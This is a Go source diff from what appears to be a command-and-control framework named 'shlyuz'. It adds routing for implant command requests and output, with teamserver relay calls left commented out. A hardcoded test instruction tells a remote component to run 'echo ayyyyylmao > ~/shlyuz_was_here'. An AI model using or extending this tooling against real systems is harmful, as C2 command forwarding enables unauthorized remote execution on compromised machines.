@@ -86,11 +86,14 @@ func RouteClientInstruction(client *transport.RegisteredComponent, instruction i
 
 	switch cmd := instruction.Cmd; cmd {
 	case "icmdr":
-		// tsCmdReqRelayInstruction = GenerateCmdReqRelayInstruction
+		// tsCmdReqRelayInstruction = GenerateCmdReqRelayInstruction(&server)
 		// RelayCmdRequest(&server, tsCmdReqRelayInstruction) // to the teamserver
 		// CmdForwardInstruction = RetrieveCmdReqAck(&server)
 		// generatedInstruction = GenerateForwardCmd(client, CmdForwardInstruction)
 		generatedInstruction = GenerateForwardCmd(client)
+	case "fcmd":
+		// tsCmdOutputRelayInstruction = GenerateCmdOutputRelayInstruction(&server, instruction)
+		// RelayCmdOutput(&server ,tsCmdOutputRelayInstruction) // to the teamservber
 	}
 
 	switch cmd := generatedInstruction.Cmd; cmd {
@@ -206,7 +209,7 @@ func GenerateForwardCmd(client *transport.RegisteredComponent) instructions.Inst
 	// TODO: We would already have a txid from the server here, but since that doesn't exist yet, we'll let CreateInstructionFrame generate one
 	// outputTransaction.TxId = receivedTxID
 	// outputTransaction.Arg = receivedArgsFromInputTransaction // we already have this
-	outputTransaction.Arg = []byte(`{"Cmd": "ExecuteFire", "ComponentId": "` + client.Id + `", "args": ["echo ayyyyylmao > ~/shlyuz_was_here"]}`)
+	outputTransaction.Arg = []byte(`{"Cmd": 1, "ComponentId": "` + client.Id + `", "Args": "echo, ayyyyylmao, >, ~/shlyuz_was_here"}`)
 	forwardCmdInstructionFrame := instructions.CreateInstructionFrame(outputTransaction, false)
 	forwardCmdInstructionFrame.Pk = client.CurKeyPair.PubKey
 	return *forwardCmdInstructionFrame
